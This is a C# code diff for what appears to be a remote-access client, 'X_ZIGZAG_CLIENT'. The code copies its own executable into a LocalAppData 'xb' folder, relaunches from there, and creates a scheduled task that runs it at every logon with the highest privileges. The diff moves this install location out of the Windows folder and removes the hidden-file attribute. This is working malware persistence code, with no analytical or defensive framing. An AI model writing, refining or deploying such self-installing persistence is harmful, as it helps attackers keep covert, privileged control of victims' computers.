@@ -9,11 +9,16 @@ namespace X_ZIGZAG_CLIENT
         private static void StoreTheFile()
         {
             string executablePath = Process.GetCurrentProcess().MainModule.FileName;
-            string destinationPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), Path.GetFileName(executablePath));
+            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string xbFolderPath = Path.Combine(appDataPath, "xb");
+            if (!Directory.Exists(xbFolderPath))
+            {
+                Directory.CreateDirectory(xbFolderPath);
+            }
+            string destinationPath = Path.Combine(xbFolderPath, Path.GetFileName(executablePath));
             if (!File.Exists(destinationPath))
             {
                 File.Copy(executablePath, destinationPath);
-                File.SetAttributes(destinationPath, FileAttributes.Hidden);
                 Process.Start(destinationPath);
                 Environment.Exit(0);
             }
@@ -36,7 +41,9 @@ namespace X_ZIGZAG_CLIENT
             checkTask.WaitForExit();
             if (checkTask.ExitCode != 0)
             {
-                string taskCommand = $"/Create /SC ONLOGON /RL HIGHEST /TN \"{taskName}\" /TR \"{Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName))}\"";
+
+                // Set the destination path to the "xb" folder
+                string taskCommand = $"/Create /SC ONLOGON /RL HIGHEST /TN \"{taskName}\" /TR \"{Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "xb"), Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName))}\"";
 
                 Process createTask = new Process
                 {
